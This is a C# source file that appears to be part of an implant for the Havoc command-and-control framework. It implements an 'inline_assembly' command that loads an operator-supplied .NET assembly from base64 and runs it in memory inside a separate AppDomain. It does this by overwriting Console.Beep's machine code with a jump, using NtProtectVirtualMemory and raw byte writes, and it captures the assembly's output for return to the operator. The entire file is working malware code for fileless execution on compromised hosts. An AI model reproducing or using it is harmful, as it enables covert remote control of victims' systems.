using System;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Reflection;
using System.Linq;
using System.Text;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using HavocImplant.NativeUtils;
using static HavocImplant.NativeUtils.Wrappers;

namespace HavocImplant.AgentFunctions
{
    public class InlineAssembly : CommandInterface
    {
        public override string Command => "inline_assembly";
        public override bool Dangerous => true;
        // Darkmelkor
        public override async Task Run(int taskId)
        {
            Output = "";
            byte[] assembly_bytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);

            string args = Agent.taskingInformation[taskId].taskArguments;
            try
            {
                Output = Sacrificial.loadAppDomainModule(assembly_bytes, args);
            }
            catch
            {
            }
            ReturnOutput(taskId);
        }
    }
    class Sacrificial
    {
        
        public static string loadAppDomainModule(Byte[] bMod, string args)
        {
            string pathToDll = Assembly.GetExecutingAssembly().CodeBase;
            AppDomainSetup domainSetup = new AppDomainSetup { PrivateBinPath = pathToDll };
            AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
            isolationDomain.SetData("str", args);

            // Inline PE trick to get stdout
            /*
            AllocConsole();
            IntPtr hWin = GetConsoleWindow();
            HideWindow(hWin);
            */
            try
            {
                isolationDomain.Load(bMod);
            }
            catch { }
            var Sleeve = new CrossAppDomainDelegate(Console.Beep);
            var Ace = new CrossAppDomainDelegate(ActivateLoader);

            RuntimeHelpers.PrepareDelegate(Sleeve);
            RuntimeHelpers.PrepareDelegate(Ace);

            BindingFlags flags = BindingFlags.Instance | BindingFlags.NonPublic;
            IntPtr codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
            IntPtr codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);

            int[] patch = new int[3];

            patch[0] = 10;
            patch[1] = 11;
            patch[2] = 12;


            IntPtr regSize = (IntPtr)12;
            NtProtectVirtualMemory((IntPtr)(-1), codeSleeve, ref regSize, (uint)0x4, out uint unused);

            Marshal.WriteByte(codeSleeve, 0x48);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
            Marshal.WriteIntPtr(IntPtr.Add(codeSleeve, 2), codeAce);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
            Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);

            NtProtectVirtualMemory((IntPtr)(-1), codeSleeve, ref regSize, (uint)0x20, out unused);

            try
            {
                isolationDomain.DoCallBack(Sleeve);
            }
            catch
            { 
            }
            string output = isolationDomain.GetData("str") as string;
            unloadAppDomain(isolationDomain);
            return output;
        }

        static void ActivateLoader()
        {
            Console.WriteLine("Activating");
            string str = AppDomain.CurrentDomain.GetData("str") as string;
            string output = "";
            foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (!asm.FullName.ToLower().Contains("mscor"))
                {
                    Console.WriteLine($"Hi from {asm.FullName}");
                    
                    TextWriter realStdOut = Console.Out;
                    TextWriter realStdErr = Console.Error;
                    TextWriter stdOutWriter = new StringWriter();
                    TextWriter stdErrWriter = new StringWriter();
                    Console.SetOut(stdOutWriter);
                    Console.SetError(stdErrWriter);
                    
                    var result = asm.EntryPoint.Invoke(null, new object[] { new string[] { str } });
                    
                    Console.Out.Flush();
                    Console.Error.Flush();
                    Console.SetOut(realStdOut);
                    Console.SetError(realStdErr);

                    output = stdOutWriter.ToString();
                    output += stdErrWriter.ToString();
                    
                }
            }
            AppDomain.CurrentDomain.SetData("str", output);
        }

        public static void unloadAppDomain(AppDomain oDomain)
        {
            AppDomain.Unload(oDomain);
        }

    }

}
